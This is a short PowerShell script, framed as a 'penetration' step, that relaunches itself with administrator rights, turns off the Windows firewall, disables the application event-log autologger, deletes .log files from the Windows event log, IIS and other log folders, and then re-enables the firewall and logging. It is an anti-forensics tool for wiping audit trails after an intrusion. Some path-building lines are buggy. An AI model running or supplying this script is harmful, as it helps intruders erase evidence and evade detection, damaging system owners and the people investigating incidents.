Function checkRunAsAdministrator()
{
  #Get current user context
  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
  
  #Check user is running the script is member of Administrator Group
  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
  {
       return $true
  }
  else
    {
       #Create a new Elevated process to Start PowerShell
       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
 
       # Specify the current script path and name as a parameter
       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
 
       #Set the Process to elevated
       $ElevatedProcess.Verb = "runas"
 
       #Start the new elevated process
       [System.Diagnostics.Process]::Start($ElevatedProcess)
 
       #Exit from the current, unelevated, process
       Exit
 
    }
}

#check if a path exists
Function checkIfFolderExists {
     param(
        [string]$FolderPath
    )

    if (Test-Path -Path $FolderPath) {
        Write-Host "Folder " + $FolderPath + " exists."
        return $true
    }
    Write-Host "Folder " + $FolderPath + " does not exists."
    return $false
}

Function removeLogFilesFromAFolder {
     param(
        [string]$FolderPath
    )

    if(checkIfFolderExists -Folderpath $FolderPath) {
        Write-Host "Initiaing file deletion on " + $FolderPath
        Remove-Item $FolderPath + "\*.log"
        Write-Host "File deleted from " + $FolderPath
    }
}
 
#Check Script is running with Elevated Privileges
if(checkRunAsAdministrator) {
    Write-Host "Initated Penetration ..."

    # Disabled Firewalld
    Set-NetFirewallProfile -Enabled False

    #Disabled the EventLog Service
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 0 -Type DWord

    #Removed all the log files
    removeLogFilesFromAFolder -Folderpath "C:\Logs"
    removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
    removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
    removeLogFilesFromAFolder -Folderpath "%SystemRoot%\Logs\WindowsUpdate"

    #Enabled Firewalld
    Set-NetFirewallProfile -Enabled True

    #Enabled the EventLog Service
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 1 -Type DWord
}